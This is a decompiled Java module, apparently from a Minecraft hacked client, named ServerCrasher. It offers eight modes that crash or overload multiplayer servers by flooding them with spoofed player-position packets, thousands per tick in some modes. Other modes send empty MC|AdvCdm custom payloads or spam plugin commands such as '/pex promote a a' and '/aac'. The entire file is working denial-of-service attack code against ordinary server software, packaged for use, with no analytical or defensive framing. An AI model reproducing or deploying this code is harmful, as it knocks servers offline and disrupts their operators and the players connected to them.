/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 */
package heaven.main.module.modules.misc;

import heaven.main.event.EventHandler;
import heaven.main.event.events.world.EventPacketSend;
import heaven.main.event.events.world.EventTick;
import heaven.main.module.Module;
import heaven.main.module.ModuleType;
import heaven.main.utils.timer.TimerUtil;
import heaven.main.value.Mode;
import heaven.main.value.Numbers;
import io.netty.buffer.Unpooled;
import java.io.Serializable;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ServerCrasher
extends Module {
    private final Mode<String> mode = new Mode("Mode", new String[]{"C07", "Packet", "OldPacket", "WorldSpeed", "SuperTP", "Payload", "Pex", "AACCommand"}, "Packet");
    public final Numbers<Double> delayy = new Numbers<Double>("Delay", 300.0, 0.0, 1000.0, 1.0);
    private final TimerUtil delay = new TimerUtil();

    public ServerCrasher() {
        super("ServerCrasher", ModuleType.Misc);
        this.addValues(this.mode, this.delayy);
    }

    @Override
    public void onDisable() {
        this.delay.reset();
        super.onDisable();
    }

    @EventHandler
    public void onTick(EventTick event) {
        block3: {
            block2: {
                if (Minecraft.thePlayer == null) break block2;
                if (Minecraft.theWorld == null) break block2;
                if (Minecraft.thePlayer.isEntityAlive()) break block3;
            }
            this.setEnabled(false);
        }
    }

    @EventHandler
    private void onPre(EventPacketSend e) {
        this.setSuffix((Serializable)this.mode.getValue());
        if (this.mode.isCurrentMode("Packet") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 1.0, Minecraft.thePlayer.posZ, false));
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 0.11, Minecraft.thePlayer.posZ, false));
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("C07") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            Minecraft.thePlayer.setPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 0.5, Minecraft.thePlayer.posZ);
            if (Minecraft.thePlayer.onGround) {
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 2.5, Minecraft.thePlayer.posZ, false));
                Minecraft.thePlayer.motionY = 0.8;
            } else {
                Minecraft.thePlayer.motionY = 8.0;
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX + 0.2, Minecraft.thePlayer.posY, Minecraft.thePlayer.posZ + 0.2, false));
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 3.0, Minecraft.thePlayer.posZ, false));
            }
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("OldPacket") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            int i;
            if (mc.isSingleplayer()) {
                this.setEnabled(false);
                return;
            }
            double playerX = Minecraft.thePlayer.posX;
            double playerY = Minecraft.thePlayer.posY;
            double playerZ = Minecraft.thePlayer.posZ;
            double y = 0.0;
            for (i = 0; i < 200; ++i) {
                y = i * 9;
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
            }
            for (i = 0; i < 10000; ++i) {
                double z = i * 9;
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
            }
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("WorldSpeed") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            for (int index = 0; index < 9999; ++index) {
                Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX + (double)(9412 * index), Minecraft.thePlayer.getEntityBoundingBox().minY + (double)(9412 * index), Minecraft.thePlayer.posZ + (double)(9412 * index), true));
            }
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("SuperTP") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 50.0, Minecraft.thePlayer.posZ, false));
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.thePlayer.posX, Minecraft.thePlayer.posY + 100.0, Minecraft.thePlayer.posZ, false));
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("Payload") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("AACCommand") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            Minecraft.thePlayer.sendChatMessage(new Random().nextBoolean() ? "/aac:aac" : "/aac");
            this.delay.reset();
        }
        if (this.mode.isCurrentMode("Pex") && this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
            Minecraft.thePlayer.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
            this.delay.reset();
        }
    }
}

